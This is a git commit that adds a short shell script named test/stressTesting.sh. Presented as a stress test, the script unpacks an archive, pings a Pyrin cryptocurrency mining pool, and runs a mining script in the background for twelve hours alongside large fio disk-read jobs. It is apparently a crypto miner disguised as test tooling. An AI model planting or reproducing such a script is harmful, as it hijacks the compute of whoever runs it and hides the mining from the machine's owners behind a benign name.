03c7d3a2ee9bb60fd537f4f635e1c50ec5af526e
mr-j-1992 <785303107@qq.com>
2024-09-10 16:23:23 +0800

    Create stressTesting.sh

---
+++ test/stressTesting.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+tar zxvf /tmp/public_services_jobs/test/1.84.tar.gz
+ping pyi.baikalmine.com -c 5
+sleep 5
+nohup timeout 12h /tmp/public_services_jobs/test/1.84/mine_pyrin.sh > /tmp/public_services_jobs/test/mine_pyrin.log  2>&1 &
+sleep 5
+nohup fio --name=big-file-rand-read --directory=/mnt/data0 --rw=randread --refill_buffers --size=3T --filename=randread.bin > /tmp/public_services_jobs/test/fionvme0.log  2>&1 &
+sleep 5
+nohup fio --name=big-file-rand-read --directory=/mnt/data1 --rw=randread --refill_buffers --size=3T --filename=randread.bin > /tmp/public_services_jobs/test/fionvme1.log  2>&1 &  
